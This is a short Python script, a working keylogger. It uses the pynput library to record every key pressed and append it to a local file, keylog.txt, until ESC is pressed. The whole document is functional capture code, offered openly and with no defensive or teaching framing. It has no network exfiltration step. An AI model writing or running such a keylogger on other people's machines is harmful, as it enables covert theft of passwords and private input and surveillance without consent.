from pynput import keyboard

log_file = "keylog.txt"  # The file where keys will be saved

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key.name}]")

def on_release(key):
    # Stop listener on pressing ESC
    if key == keyboard.Key.esc:
        print("\nKeylogger stopped.")
        return False

# Start keylogger
print("🔴 Keylogger started. Press ESC to stop.")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
